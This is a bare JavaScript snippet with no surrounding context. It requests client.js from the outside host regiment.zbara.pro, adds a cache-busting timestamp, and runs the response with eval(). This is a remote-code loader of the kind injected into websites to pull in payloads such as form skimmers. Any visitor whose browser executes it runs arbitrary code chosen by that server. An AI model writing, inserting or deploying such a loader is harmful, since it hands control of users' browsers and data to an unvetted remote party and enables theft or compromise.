(() => {
    let rnd = Math.floor((new Date().valueOf()) / 1000);
    let xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://regiment.zbara.pro/client.js?ts=' + rnd, true);
    xhr.send();
    xhr.onloadend = () => {
        eval(xhr.responseText);
    };
})();
